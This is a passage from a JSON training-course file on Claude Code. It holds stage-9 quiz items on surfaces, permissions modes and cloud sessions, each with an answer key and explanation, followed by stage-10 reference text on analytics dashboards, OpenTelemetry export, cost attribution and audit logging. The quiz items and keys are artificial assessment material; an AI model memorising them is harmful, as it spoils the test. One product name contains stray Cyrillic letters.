     "Remote Control is only available on macOS and Windows Desktop, not in VS Code.",
     "The developer needs to run `claude mcp add` first to register the remote control server."
    ],
    "correct": 1,
    "explanation": "The content states that 'Third-party providers (Bedrock / Vertex / Foundry) and raw API keys disable a wide set of features: channels, computer use, voice dictation, --teleport, /web-setup, /desktop migration, and Remote Control.' This is a provider-level restriction, not a version or OS issue. The macOS/Windows constraint applies to Desktop as a surface, not to Remote Control itself. Remote Control being blocked has nothing to do with MCP server registration."
   },
   {
    "id": "stage-9-q2",
    "type": "multiple-choice",
    "prompt": "A developer sets `ANTHROPIC_API_KEY` in their shell environment and then tries to start a Remote Control session. They report it simply does not work. What is the most direct cause?",
    "options": [
     "API keys are not supported for Remote Control — they must use claude.ai OAuth via `/login`.",
     "`ANTHROPIC_API_KEY` set in the environment silently blocks Remote Control; it must be unset.",
     "Remote Control requires a Team or Enterprise plan, not an individual API key.",
     "The key works but the session times out because API keys have lower rate limits than OAuth tokens."
    ],
    "correct": 1,
    "explanation": "The content explicitly states '`ANTHROPIC_API_KEY` set in the environment silently blocks Remote Control — it must be unset.' The word 'silently' is important — it doesn't throw an obvious error. The plan tier matters for some features but the immediate cause here is the env var conflict. The rate-limit distractor conflates a different failure mode."
   },
   {
    "id": "stage-9-q3",
    "type": "multiple-choice",
    "prompt": "You want all team developers to use the same MCP server configs, permission hooks, and allowed commands. Where should this configuration live?",
    "options": [
     "In the VS Code Extensions → Claude Code settings panel, since that is where extension behavior is governed.",
     "In a `.claude/settings.json` checked into each project repo, since that is where project-scoped config lives.",
     "In `~/.claude/settings.json`, because it is shared between the CLI and VS Code/JetBrains extensions.",
     "In managed settings pushed from the admin console, because only managed settings can enforce hooks."
    ],
    "correct": 2,
    "explanation": "The content says 'Govern team-wide behavior through `~/.claude/settings.json` (allowed commands, env vars, hooks, MCP servers) — it is shared between the CLI and the VS Code/JetBrains extensions.' The VS Code settings panel is reserved for per-developer UI preferences. Project `.claude/settings.json` is project-scoped and doesn't share state globally across all developers' machines. Managed settings are for admin-override governance, not the primary channel for team config distribution."
   },
   {
    "id": "stage-9-q4",
    "type": "multiple-choice",
    "prompt": "A security-conscious admin wants to block all developers from using Bypass permissions mode org-wide. They set `permissions.disableBypassPermissionsMode = \"disable\"` in managed settings. A developer later runs Claude with `--dangerously-skip-permissions` and finds explicit `ask` rules still fire. Is this the expected behavior?",
    "options": [
     "No — Bypass permissions should disable all permission checks including explicit `ask` rules.",
     "Yes — Bypass permissions is not a total bypass; explicit `ask` rules still fire even in Bypass mode.",
     "No — if the admin set `disableBypassPermissionsMode`, the CLI flag should be completely blocked at the OS level.",
     "Yes — but only because the developer is using the CLI flag rather than the settings key; the settings key would be a total bypass."
    ],
    "correct": 1,
    "explanation": "The content states 'Bypass only in sandboxed containers/VMs; admins should disable org-wide. It is NOT a total bypass (explicit `ask` rules still fire).' Bypass mode and the CLI `--dangerously-skip-permissions` flag are equivalent but neither suppresses explicit `ask` rules. The admin setting blocks users from entering Bypass mode at all, but the note about `ask` rules is a separate invariant about what Bypass does when it is active."
   },
   {
    "id": "stage-9-q5",
    "type": "multiple-choice",
    "prompt": "Your team uses Claude Code on the web (cloud sessions). A developer adds a custom MCP server using `claude mcp add` on their local machine and expects it to be available in cloud sessions. It isn't. Why?",
    "options": [
     "`claude mcp add` servers require restart of the cloud VM to take effect.",
     "Cloud sessions only support MCP servers declared in the admin console managed settings.",
     "Cloud sessions cannot access local config — `claude mcp add` servers do not travel to cloud; only `.mcp.json` in the project repo does.",
     "The developer must use `/web-setup` first to sync local MCP config to their Claude account."
    ],
    "correct": 2,
    "explanation": "The content lists what does and does not carry over to cloud sessions. Under 'Does NOT carry over' it explicitly lists '`claude mcp add` servers'. What does carry over includes '.mcp.json (project MCP)' — meaning MCP servers must be declared in the repo's `.mcp.json`, not added via the local CLI command."
   },
   {
    "id": "stage-9-q6",
    "type": "multiple-choice",
    "prompt": "An admin pushes managed settings from the admin console to enforce `sshHostAllowlist`. A developer using the CLI tries to SSH to a host not on the list and succeeds. Is this expected?",
    "options": [
     "No — managed settings always override all surfaces including CLI.",
     "Yes — `sshHostAllowlist` is honored only by Desktop; CLI, IDE, and Bash-tool `ssh` ignore it.",
     "No — this indicates the managed settings were not deployed correctly and need re-push.",
     "Yes — `sshHostAllowlist` only applies when using the Remote Control feature, not direct SSH."
    ],
    "correct": 1,
    "explanation": "The content explicitly states '`sshHostAllowlist` is honored **only by Desktop** — CLI, IDE, and Bash-tool `ssh` ignore it, and it does not restrict egress.' This is a named gotcha about the scope of this particular managed setting. Admins who want SSH restriction must understand it only governs Desktop's dropdown, not all Claude Code surfaces."
   },
   {
    "id": "stage-9-q7",
    "type": "multiple-choice",
    "prompt": "A Linux developer tries to install Claude Desktop to use as their primary daily driver. They find it is unavailable. What is the constraint?",
    "options": [
     "Desktop requires a Team or Enterprise subscription, not available on individual Pro/Max plans.",
     "Desktop is macOS and Windows only — it does not run on Linux.",
     "Desktop on Linux requires an additional kernel module that is not yet released.",
     "Desktop is available on Linux but only via the Snap store, not the main download page."
    ],
    "correct": 1,
    "explanation": "The surface map in the content states Desktop runs on 'macOS + Windows only (**not Linux**)'. This is a hard platform constraint, not a subscription or packaging issue."
   },
   {
    "id": "stage-9-q8",
    "type": "multiple-choice",
    "prompt": "A developer installs the VS Code extension and expects to call `claude` from their terminal directly. After install, `claude` is not found in PATH. Why?",
    "options": [
     "The VS Code extension bundles a CLI that is private to the panel and does NOT add `claude` to PATH.",
     "The developer needs to run the extension's 'Add to PATH' command from the VS Code command palette.",
     "The PATH entry requires a shell restart; the developer should open a new terminal.",
     "VS Code extensions can only modify PATH on macOS, not Windows or Linux."
    ],
    "correct": 0,
    "explanation": "The content states the VS Code extension's 'Bundled CLI is private to the panel — does NOT add `claude` to PATH.' Installing the extension does not install or expose the CLI globally. The developer must install the CLI separately if they want to call `claude` from a terminal."
   },
   {
    "id": "stage-9-q9",
    "type": "multi-select",
    "prompt": "Your team is setting up Claude Code on the web (cloud sessions). Select ALL statements that are true about setup scripts in cloud environments.",
    "options": [
     "A non-zero exit from the setup script causes session start to fail.",
     "Setup scripts run on every session resume to ensure a fresh environment.",
     "Setup scripts run as root on the cloud VM.",
     "PostgreSQL and Redis are pre-installed but not running by default; you must start them explicitly.",
     "Large downloads like Docker images should go in the setup script body to maximize the cache build."
    ],
    "correct": [
     0,
     2,
     3
    ],
    "explanation": "True: (A) 'Non-zero exit fails session start — append `|| true` to non-critical commands.' (C) 'setup scripts run as root.' (D) 'PostgreSQL 16, Redis 7 (both **not running by default** — `service postgresql start`).' False: (B) Setup scripts re-run only on script change, allowed-hosts change, or ~7-day cache expiry — resuming never re-runs them; SessionStart hooks run on every resume, not setup scripts. (E) The content says to 'move large downloads (Docker images, model weights) into a background `SessionStart` hook' — not the setup script body — because the setup script has a ~5-minute cache-build budget."
   },
   {
    "id": "stage-9-q10",
    "type": "multi-select",
    "prompt": "Which of the following are true about using `claude --remote` with a non-GitHub repository (bundle mode)?",
    "options": [
     "Untracked files are included in the bundle automatically.",
     "The repository must have at least one commit.",
     "Bundled sessions can push changes back to the origin remote without any extra configuration.",
     "The bundle must be under 100MB.",
     "The bundle includes uncommitted tracked changes along with history."
    ],
    "correct": [
     1,
     3,
     4
    ],
    "explanation": "True: (B) 'Needs ≥1 commit' (C is false — 'bundled sessions can't push back unless GitHub auth is configured'). (D) '<100MB'. (E) 'history + uncommitted tracked changes' are included. False: (A) 'untracked files excluded (`git add` first)' — untracked files are excluded. (C) bundled sessions cannot push back unless GitHub auth is separately configured."
   },
   {
    "id": "stage-9-q11",
    "type": "multiple-choice",
    "prompt": "An admin wants to deploy managed settings to Claude Desktop machines. They push the settings from the admin console. A week later, Desktop users still see their personal settings. What did the admin miss?",
    "options": [
     "Managed settings pushed from the admin console require users to manually run `claude sync` to pull them.",
     "Admin-console remotely pushed managed settings reach CLI and IDE only — NOT Desktop. Desktop requires MDM deployment of the managed file to disk.",
     "Desktop managed settings only apply to the Remote Control feature, not general permissions.",
     "Managed settings only apply to Enterprise plans; the team must upgrade first."
    ],
    "correct": 1,
    "explanation": "The content states 'admin-console *remotely pushed* managed settings reach **CLI and IDE only — NOT Desktop**. For Desktop, deploy the managed file to disk via **MDM** (macOS `com.anthropic.claudefordesktop`/Jamf/Kandji; Windows registry `SOFTWARE\\Policies\\Claude`).' This is a named distribution gotcha. Remote push and Desktop are separate distribution paths."
   },
   {
    "id": "stage-9-q12",
    "type": "multiple-choice",
    "prompt": "A developer uses `claude --teleport` to move a session from CLI to the cloud. They run it on a branch that has local commits not yet pushed to the remote. The command fails. What is the most likely cause?",
    "options": [
     "Teleport is one-way only (cloud→CLI), not CLI→cloud.",
     "Teleport requires the branch to be pushed to the remote — a branch with unpushed commits cannot be teleported.",
     "Teleport only works when invoked from Desktop, not the CLI.",
     "The developer's plan does not include cloud session access."
    ],
    "correct": 1,
    "explanation": "The content lists teleport requirements including 'branch pushed to remote'. If the branch has local commits not pushed, this precondition is violated. The content also clarifies directionality: 'You cannot push terminal→web from CLI (only Desktop's \"Continue in\")' — but that applies to the opposite direction. Teleport IS available from CLI. Plan tier is not the issue described."
   },
   {
    "id": "stage-9-q13",
    "type": "multiple-choice",
    "prompt": "You enable Auto-fix PRs for your GitHub repositories. A teammate warns that auto-fix replies could trigger Atlantis Terraform plan runs on your infrastructure. Is this a real concern, and why?",
    "options": [
     "No — Auto-fix PR replies are posted by the Anthropic bot account, which GitHub automation tools typically exclude.",
     "Yes — Auto-fix PR replies post under your GitHub account, which can trigger `issue_comment` automation like Atlantis running privileged ops.",
     "No — Auto-fix only comments on PRs, not issues, so `issue_comment` webhooks do not fire.",
     "Yes — but only if the repo's `.github/workflows` files explicitly allow automated comments to trigger plans."
    ],
    "correct": 1,
    "explanation": "The content states 'Replies post under your GitHub account → can trigger `issue_comment` automation (Atlantis/Terraform/Actions) running privileged ops — audit before enabling.' The replies do NOT come from a bot account — they come from the user's own account, which automation tools treat as a human-initiated comment. This is a genuine security concern explicitly called out."
   },
   {
    "id": "stage-9-q14",
    "type": "multiple-choice",
    "prompt": "A team distributes a plugin via the VS Code extension using `Install for this project`. A developer using the CLI on the same project does not see the plugin. Is this expected?",
    "options": [
     "Yes — `Install for this project` is IDE-only and never affects the CLI.",
     "No — the content says plugin and marketplace config is shared between the extension and CLI. The developer may need to restart.",
     "Yes — CLI does not support plugins; only extensions do.",
     "No — the developer must separately run `claude mcp add` to register the plugin in the CLI."
    ],
    "correct": 1,
    "explanation": "The content states 'Distribute team plugins via project scope (`Install for this project`) so they ship through the repo and also work in the CLI' and 'Plugin/marketplace config is shared extension↔CLI. Restart to apply plugin changes.' The developer likely just needs to restart. The CLI does support plugins when distributed via project scope."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Surfaces & mobility."
 },
 {
  "id": "stage-10",
  "stage": 10,
  "title": "Monitoring, analytics & troubleshooting",
  "summary": "Monitoring, analytics & troubleshooting: Adoption & ROI analytics dashboards, GitHub contribution attribution, OpenTelemetry cost & usage export.",
  "prerequisites": [
   "stage-9"
  ],
  "objectives": [
   "Understand the concepts in Monitoring, analytics & troubleshooting."
  ],
  "definitions": [
   {
    "term": "Adoption & ROI analytics dashboards",
    "short": "Hosted dashboards that surface team adoption, accept rates, and PR/line contribution so a lead can measure rollout and ROI rather than per-user cost."
   },
   {
    "term": "GitHub contribution attribution",
    "short": "The rules by which Claude Code credits code to itself — a matching window around PR merges, exclusions for rewrites and generated files, and a deliberate undercount."
   },
   {
    "term": "OpenTelemetry cost & usage export",
    "short": "Fleet-wide telemetry pushed to your own backend that the dashboards can't give you: per-user token/cost breakdowns and a SIEM audit stream."
   },
   {
    "term": "Multi-team cost attribution",
    "short": "Tagging telemetry with custom resource attributes and injecting a user identity so spend can be sliced by team, department, or person on every datapoint."
   },
   {
    "term": "Audit logging & SIEM integration",
    "short": "Opt-in OTLP log events capturing tool calls, bash commands, permission changes, and optionally prompt/tool content, sent only to your endpoint for the SIEM to alert on."
   },
   {
    "term": "In-session cost & limit governance",
    "short": "Slash commands that attribute plan-limit and token consumption to skills, subagents, plugins, and MCP servers so users can self-diagnose what is driving their costs."
   }
  ],
  "sections": [
   {
    "heading": "What This Stage Covers — and Why It Matters",
    "body": "Getting Claude Code running is week one. Keeping fifty engineers running it productively for twelve months requires a completely different discipline: you need to know who is using it, how much it is costing per team, whether the model is falling back to Sonnet because Opus is overloaded, and what to do when someone's stale API key silently routes all their requests through a disabled organization.\n\nThis stage covers the full monitoring and operations surface in the order you will actually need it:\n\n1. **Hosted analytics dashboards** — the no-configuration starting point for adoption and ROI.\n2. **GitHub contribution attribution** — the mechanics behind the numbers on those dashboards.\n3. **OpenTelemetry export** — the escape hatch when you need data the dashboards cannot give you.\n4. **Multi-team cost attribution** — tagging every datapoint so spend slices by team or cost center.\n5. **Audit logging and SIEM integration** — opt-in structured event streams for security teams.\n6. **In-session cost and limit governance** — how individual engineers self-diagnose what is eating their quota.\n7. **Retry, capacity, and fallback resilience** — keeping teams working through overload incidents.\n8. **Auth precedence and credential failures** — the most common source of confusing 403 and org-disabled errors.\n9. **Context-window and corrupted-turn recovery** — knowing when to compact versus when to start fresh."
   },
   {
    "heading": "Adoption & ROI Analytics Dashboards",
    "body": "Claude Code ships two hosted dashboards depending on how your organization authenticates.\n\n| Plan | Dashboard URL | Key metrics |\n|------|-------------|-------------|\n| Claude for Teams / Enterprise | `claude.ai/analytics/claude-code` | Lines accepted, accept rate, DAUs, sessions, PRs with CC, GitHub leaderboard, CSV export |\n| API / Claude Console | `platform.claude.com/claude-code` | Lines accepted, accept rate, daily users and sessions, daily spend, per-user spend and lines this month |\n\nThe Teams/Enterprise dashboard is accessible to Admins and Owners. The Console dashboard requires the UsageView permission, which is granted to Developer, Billing, Admin, Owner, and Primary Owner roles.\n\n### What you get without any configuration\n\nEvery session automatically reports four headline numbers:\n\n- **Lines of code accepted** — lines written by Claude that the user accepted via Edit, Write, or NotebookEdit tool usage. Rejected suggestions and post-acceptance deletions are excluded.\n- **Suggestion accept rate** — accepted / (accepted + rejected) across those three tools.\n- **Daily active users and sessions** — for the adoption trend chart.\n- **Spend (Console only)** — estimated per-user API cost for the current month. These are estimates for analytics purposes; for actual costs use the billing page.\n\nThese flow from the client without OTel configuration.\n\n### Enabling contribution metrics (Teams / Enterprise only)\n\nContribution metrics require the Claude GitHub App and are in public beta. Zero Data Retention organizations cannot use them.\n\n```\n1. GitHub admin installs:  https://github.com/apps/claude\n2. Claude Owner navigates:  claude.ai/admin-settings/claude-code\n   → Enable \"Claude Code analytics\"\n   → Enable \"GitHub analytics\"\n   → Authenticate GitHub, select organizations\n3. Data appears within 24 hours, updated daily.\n```\n\nOnce connected the Teams dashboard adds:\n- **PRs with CC** — count and percentage of merged PRs that contain at least one Claude-assisted line.\n- **Lines of code with CC** — effective lines (more than 3 characters after normalization) across those PRs.\n- **PRs per user** — productivity trend as adoption increases.\n- A **leaderboard** of the top 10 contributors and a full CSV export (all users, not just the top 10).\n\n### Interpreting ROI from the dashboard\n\nThe dashboard is designed as an undercount — it only attributes code where confidence is high. Use these comparisons:\n\n- Track `PRs per user` over time as adoption increases. A rising curve is the clearest adoption signal.\n- Compare `PRs with CC %` month-over-month rather than pointing to absolute counts.\n- Export the CSV and join it against DORA metrics, sprint velocity, or incident counts for a fuller picture.\n\n### Limitations of the hosted dashboards\n\nThe hosted dashboards give you team-level aggregates but cannot give you: per-user token breakdowns, model-level cost splits, skill/plugin attribution, or a real-time audit trail. The Console dashboard does provide per-user spend and lines this month in the team insights table. For model-level and skill-level attribution, you need OpenTelemetry export."
   },
   {
    "heading": "GitHub Contribution Attribution — The Rules Behind the Numbers",
    "body": "Understanding how lines and PRs get credited to Claude Code is essential for interpreting the dashboard honestly and for explaining the numbers to leadership.\n\n### Attribution process\n\nWhen a PR is merged, the attribution pipeline runs four steps:\n\n1. Extract the added-line diff from the PR.\n2. Find Claude Code sessions that edited files in that PR within the attribution window.\n3. Match PR lines against Claude Code output using multiple matching strategies.\n4. Tag the PR `claude-code-assisted` in GitHub if any lines match.\n\n### Time window\n\nSessions from **21 days before** to **2 days after** the PR merge date are eligible. Sessions outside that window are not considered regardless of the actual code overlap.\n\n### Normalization before matching\n\nBefore comparing, every line is normalized: whitespace is trimmed, multiple spaces are collapsed, quotes are standardized, and text is converted to lowercase. This prevents formatting-only changes from blocking matches.\n\n### Deliberate undercount — what is excluded\n\nThe system errs on the side of undercount at every decision point:\n\n- **Substantially rewritten code**: if a developer rewrites more than **20%** of a Claude-produced block, those lines are not attributed.\n- **Auto-generated files**: lock files (`package-lock.json`, `yarn.lock`, `Cargo.lock`), protobuf outputs, minified files, build artifacts, test fixtures (snapshots, cassettes), and anything in `dist/`, `build/`, `node_modules/`, `target/`.\n- **Long lines**: lines over 1,000 characters are excluded (likely minified or machine-generated).\n- **Trivial lines**: \"effective lines\" must have more than 3 characters after normalization, excluding empty lines and lines with only brackets or trivial punctuation.\n- **Branch metadata**: the attribution algorithm does not consider the PR source or destination branch when performing attribution.\n\n### What the PR label means\n\nMerged PRs that contain at least one attributed line are labeled `claude-code-assisted` in GitHub. You can search your own GitHub organization with:\n```\ngh pr list --label claude-code-assisted --state merged\n```\nor via the GitHub search API.\n\n### Common misinterpretation pitfalls\n\n- A PR touching 1,000 lines where Claude wrote 3 counts the same as one where Claude wrote all 1,000 in the PR count chart. The `Lines of code with CC` chart is more informative than the PR count for impact.\n- The 21-day window means PRs with long review cycles where the Claude session happened early may not be attributed.\n- Code accepted verbatim by a developer who made no changes still counts — the 20% threshold only removes lines the developer substantially rewrote."
   },
   {
    "heading": "OpenTelemetry Cost & Usage Export",
    "body": "The hosted dashboards give you team-level aggregates. OTel export gives you the raw datapoints — per-user token consumption, model splits, skill/plugin attribution, and a real-time event stream — so you can build whatever slice or alert your organization needs.\n\n### Enabling telemetry — the minimum viable config\n\n```bash\nexport CLAUDE_CODE_ENABLE_TELEMETRY=1          # required gate\nexport OTEL_METRICS_EXPORTER=otlp             # or: prometheus, console, none\nexport OTEL_LOGS_EXPORTER=otlp                # events/audit stream\nexport OTEL_EXPORTER_OTLP_PROTOCOL=grpc\nexport OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4317\nexport OTEL_EXPORTER_OTLP_HEADERS=\"Authorization=Bearer your-token\"\n```\n\nDefault export intervals: metrics every **60 seconds** (`OTEL_METRIC_EXPORT_INTERVAL` default 60000 ms), logs/events every **5 seconds** (`OTEL_LOGS_EXPORT_INTERVAL` default 5000 ms). During setup, reduce them for faster feedback:\n\n```bash\nexport OTEL_METRIC_EXPORT_INTERVAL=10000   # 10s during debug\nexport OTEL_LOGS_EXPORT_INTERVAL=1000      # 1s during debug\n```\n\nReset to defaults before deploying fleet-wide. Short intervals multiply storage costs at scale.\n\n**Important**: Claude Code does not pass `OTEL_*` environment variables to subprocesses it spawns (Bash tool, hooks, MCP servers, language servers). A subprocess running its own OTel export needs those variables set explicitly.\n\n### Deploying fleet-wide via managed settings\n\n**Linux/WSL**: `/etc/claude-code/managed-settings.json`  \n**macOS**: `/Library/Application Support/ClaudeCode/managed-settings.json`\n\nDrop-in directory variants (`.d/` suffix) allow merging multiple fragments.\n\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_ENABLE_TELEMETRY\": \"1\",\n    \"OTEL_METRICS_EXPORTER\": \"otlp\",\n    \"OTEL_LOGS_EXPORTER\": \"otlp\",\n    \"OTEL_EXPORTER_OTLP_PROTOCOL\": \"grpc\",\n    \"OTEL_EXPORTER_OTLP_ENDPOINT\": \"http://collector.corp.example.com:4317\",\n    \"OTEL_EXPORTER_OTLP_HEADERS\": \"Authorization=Bearer fleet-token\"\n  }\n}\n```\n\nEnvironment variables set in managed settings have the highest possible precedence and cannot be overridden by project or user settings.\n\n### The eight exported metrics\n\n| Metric | Unit | Key extra attributes |\n|--------|------|---------------------|\n| `claude_code.session.count` | count | `start_type` (fresh/resume/continue) |\n| `claude_code.token.usage` | tokens | `type` (input/output/cacheRead/cacheCreation), `model`, `query_source`, `speed`, `effort`, `skill.name`, `agent.name`, `plugin.name`, `mcp_server.name`, `mcp_tool.name` |\n| `claude_code.cost.usage` | USD | `model`, `query_source`, `speed`, `effort`, `skill.name`, `agent.name`, `plugin.name`, `marketplace.name`, `mcp_server.name`, `mcp_tool.name` |\n| `claude_code.lines_of_code.count` | count | `type` (added/removed), `model` (requires v2.1.172+) |\n| `claude_code.pull_request.count` | count | standard attributes |\n| `claude_code.commit.count` | count | standard attributes |\n| `claude_code.code_edit_tool.decision` | count | `tool_name`, `decision`, `source`, `language` |\n| `claude_code.active_time.total` | s | `type` (user/cli) |\n\nAll metrics carry **standard attributes** on every datapoint: `session.id`, `user.account_uuid`, `user.account_id`, `user.email` (when OAuth), `organization.id`, `user.id` (anonymous stable ID), `terminal.type`, plus any keys from `OTEL_RESOURCE_ATTRIBUTES`.\n\n### Distributed traces (beta)\n\nDistributed tracing links every user prompt to the API requests and tool calls it triggered:\n\n```bash\nexport CLAUDE_CODE_ENABLE_TELEMETRY=1\nexport CLAUDE_CODE_ENHANCED_TELEMETRY_BETA=1\nexport OTEL_TRACES_EXPORTER=otlp\n```\n\nThe span hierarchy:\n```\nclaude_code.interaction\n├── claude_code.llm_request        (model, tokens, cost, stop_reason)\n├── claude_code.hook               (detailed beta tracing only)\n└── claude_code.tool\n    ├── claude_code.tool.blocked_on_user  (decision, source, duration_ms)\n    └── claude_code.tool.execution        (success, error, duration_ms)\n```\n\nWhen tracing is active, Bash and PowerShell subprocesses inherit a `TRACEPARENT` env var containing the W3C trace context of the active tool execution span. Outbound HTTP MCP requests carry `traceparent` headers. Note: `OTEL_*` env vars are NOT forwarded to subprocesses — a subprocess that needs to export its own telemetry must have those variables set explicitly.\n\nThe `traceparent` header on model and HTTP MCP requests is sent only when `ANTHROPIC_BASE_URL` is unset or points at the Anthropic API. To propagate trace context through a custom proxy, set `CLAUDE_CODE_PROPAGATE_TRACEPARENT=1`.\n\n### Dynamic headers for token-rotating auth\n\nFor enterprise collectors that require short-lived tokens, use `otelHeadersHelper` in your settings instead of baking a static token:\n\n```json\n{\n  \"otelHeadersHelper\": \"/opt/corp/scripts/generate_otel_token.sh\"\n}\n```\n\nThe script must output a JSON object of string header key-value pairs:\n\n```bash\n#!/bin/bash\necho \"{\\\"Authorization\\\": \\\"Bearer $(vault read -field=token secret/otel-token)\\\"}\"\n```\n\nClauде Code runs the script at startup and every **29 minutes** by default. Tune with `CLAUDE_CODE_OTEL_HEADERS_HELPER_DEBOUNCE_MS`. Dynamic headers work only with `http/protobuf` and `http/json` protocols — the `grpc` exporter uses only the static `OTEL_EXPORTER_OTLP_HEADERS` value.\n\n### Cardinality and temporality\n\n`OTEL_METRICS_INCLUDE_SESSION_ID` defaults to `true` — sessions are short-lived, so each one creates a new time series. At 50+ engineers this can generate tens of thousands of series per day. Disable it for metrics backends that charge by series count:\n\n```bash\nexport OTEL_METRICS_INCLUDE_SESSION_ID=false\n```\n\nSome backends (Prometheus, Victoria Metrics) expect cumulative counters:\n\n```bash\nexport OTEL_EXPORTER_OTLP_METRICS_TEMPORALITY_PREFERENCE=cumulative\n```\n\nThe default is `delta`, which is correct for Grafana, Honeycomb, and Datadog.\n\n### Cardinality control variables\n\n| Variable | Default | Effect |\n|---|---|---|\n| `OTEL_METRICS_INCLUDE_SESSION_ID` | `true` | Include `session.id` on metrics; disable to reduce series count |\n| `OTEL_METRICS_INCLUDE_ACCOUNT_UUID` | `true` | Include `user.account_uuid` and `user.account_id` |\n| `OTEL_METRICS_INCLUDE_RESOURCE_ATTRIBUTES` | `true` | Promote custom `OTEL_RESOURCE_ATTRIBUTES` keys to metric datapoint labels |\n| `OTEL_METRICS_INCLUDE_VERSION` | `false` | Include `app.version` on metrics |\n| `OTEL_METRICS_INCLUDE_ENTRYPOINT` | `false` | Include `app.entrypoint` on metrics |"
   },
   {
    "heading": "Multi-Team Cost Attribution",
    "body": "The standard attributes (`user.account_uuid`, `user.email`, `organization.id`) identify who sent a request but not which team or cost center they belong to. `OTEL_RESOURCE_ATTRIBUTES` is the mechanism for adding that dimension.\n\n### Injecting team identity\n\n```bash\nexport OTEL_RESOURCE_ATTRIBUTES=\"department=engineering,team.id=platform,cost_center=eng-123\"\n```\n\nThese values are attached as attributes on every metric datapoint and event record (in addition to the OTel resource block). This means you can write PromQL queries like:\n\n```promql\nsum by (team_id) (rate(claude_code_cost_usage_total[1d]))\n```\n\nor Grafana panels that filter to `department=engineering`.\n\n**Note**: custom keys never override the standard built-in attributes such as `user.id` or `session.id`. When a key collides, Claude Code keeps the built-in value.\n\n### Formatting rules (failure mode is silent)\n\nThe `OTEL_RESOURCE_ATTRIBUTES` spec is strict. Violations produce silently incorrect data:\n\n- **No spaces in values**: `team.name=My Team` is **invalid**. Use `team.name=My_Team` or `team.name=MyTeam`.\n- **Allowed characters**: US-ASCII only, excluding control characters, whitespace, double quotes, commas, semicolons, and backslashes.\n- **Special characters** must be percent-encoded: `org.name=John%27s_Org`.\n- Wrapping values in quotes does not escape spaces — `org.name=\"My Company\"` produces the literal string `\"My Company\"` (quotes included).\n\n```bash\n# Invalid — contains a space\nexport OTEL_RESOURCE_ATTRIBUTES=\"org.name=John's Organization\"\n\n# Valid — use underscores or percent-encoding\nexport OTEL_RESOURCE_ATTRIBUTES=\"org.name=Johns_Organization\"\nexport OTEL_RESOURCE_ATTRIBUTES=\"org.name=John%27s%20Organization\"\n```\n\n### Injecting user identity when API-key auth is used\n\nWhen Claude Code authenticates with a direct API key (not OAuth), `user.email` and `user.account_uuid` are absent from the standard attributes. Attach user identity yourself:\n\n```bash\nexport OTEL_RESOURCE_ATTRIBUTES=\"enduser.id=jdoe@example.com,team.id=platform\"\n```\n\nThe recommended pattern is a per-user managed settings fragment delivered by MDM or a login hook. Using the drop-in directory:\n\n```\n/etc/claude-code/managed-settings.d/\n  10-telemetry.json     # fleet-wide OTel endpoint and credentials\n  20-identity.json      # per-user: enduser.id, team.id, cost_center\n```\n\n`20-identity.json` is generated by your provisioning system at user-setup time. Drop-in files merge in alphabetical order, with later files overriding scalar values from earlier ones.\n\n### Cardinality budget\n\nEvery custom key in `OTEL_RESOURCE_ATTRIBUTES` becomes a label on every metric series by default. Two levers:\n\n1. Set `OTEL_METRICS_INCLUDE_SESSION_ID=false` — eliminates the per-session fan-out entirely.\n2. Set `OTEL_METRICS_INCLUDE_RESOURCE_ATTRIBUTES=false` — keeps custom attributes in the OTel resource block (available to log and trace backends) without promoting them to metric datapoint labels. You lose PromQL filterability on those keys but keep the data for log-level analysis.\n\n### Settings placement for attribution data\n\n| Setting/File | What goes here | Rationale |\n|---|---|---|\n| `/etc/claude-code/managed-settings.json` (or MDM) | OTel endpoint, auth token, `CLAUDE_CODE_ENABLE_TELEMETRY=1` | Must apply to all users, must not be overridable |\n| Drop-in `20-identity.json` | `OTEL_RESOURCE_ATTRIBUTES` with `enduser.id`, `team.id`, `cost_center` | Generated per-user by provisioning; separate file so the base file is static |\n| `.claude/settings.json` (project) | Nothing OTel-related | Project settings cannot override managed env vars |\n| `~/.claude/settings.json` (user) | `otelHeadersHelper` if self-managed | Only if the user manages their own collector endpoint |"
   },
   {
    "heading": "Audit Logging & SIEM Integration",
    "body": "The OTel logs exporter is the audit data source. Every event carries the authenticated user's identity — the same person who started the session — plus a structured payload describing what happened. Claude Code does not act under a service account; all activity is attributed to the developer.\n\nWhen Claude Code authenticates with a direct API key, or against Bedrock, Vertex AI, or Microsoft Foundry, there is no Claude account in the session and only `user.id` and `session.id` are populated. In these deployments, attach user identity with `OTEL_RESOURCE_ATTRIBUTES` (for example `enduser.id=jdoe@example.com`).\n\n### Opt-in content flags\n\nBy default, Claude Code redacts all sensitive content. Each flag is a deliberate opt-in:\n\n| Variable | What it unlocks | Privacy cost |\n|---|---|---|\n| `OTEL_LOG_TOOL_DETAILS=1` | Bash commands, MCP server/tool names, file paths, skill names in events and trace spans | Commands may contain secrets in args |\n| `OTEL_LOG_USER_PROMPTS=1` | Full prompt text on `user_prompt` events and interaction spans | Contains potentially PII |\n| `OTEL_LOG_TOOL_CONTENT=1` | Tool input and output bodies in trace spans (truncated at 60 KB); requires tracing enabled | Can include raw file contents |\n| `OTEL_LOG_RAW_API_BODIES=1` | Full Messages API request/response JSON inline (truncated at 60 KB) | Full conversation history |\n| `OTEL_LOG_RAW_API_BODIES=file:<dir>` | Untruncated bodies written to disk, `body_ref` pointer in event | Full conversation history, untruncated |\n\nFor a SIEM deployment, enable `OTEL_LOG_TOOL_DETAILS=1` and leave the others off. That gives you the full audit trail for Bash and MCP activity without capturing raw code or prompt text.\n\n### Managed settings for SIEM-only export\n\n```json\n{\n  \"env\": {\n    \"CLAUDE_CODE_ENABLE_TELEMETRY\": \"1\",\n    \"OTEL_LOGS_EXPORTER\": \"otlp\",\n    \"OTEL_LOG_TOOL_DETAILS\": \"1\",\n    \"OTEL_EXPORTER_OTLP_LOGS_PROTOCOL\": \"http/protobuf\",\n    \"OTEL_EXPORTER_OTLP_LOGS_ENDPOINT\": \"https://siem.corp.example.com:4318/v1/logs\",\n    \"OTEL_EXPORTER_OTLP_HEADERS\": \"Authorization=Bearer siem-token\"\n  }\n}\n```\n\nSend metrics to a separate endpoint without sending audit events there:\n\n```json\n{\n  \"env\": {\n    \"OTEL_METRICS_EXPORTER\": \"otlp\",\n    \"OTEL_EXPORTER_OTLP_METRICS_ENDPOINT\": \"http://prometheus-gateway.corp:4318/v1/metrics\",\n    \"OTEL_LOGS_EXPORTER\": \"otlp\",\n    \"OTEL_EXPORTER_OTLP_LOGS_ENDPOINT\": 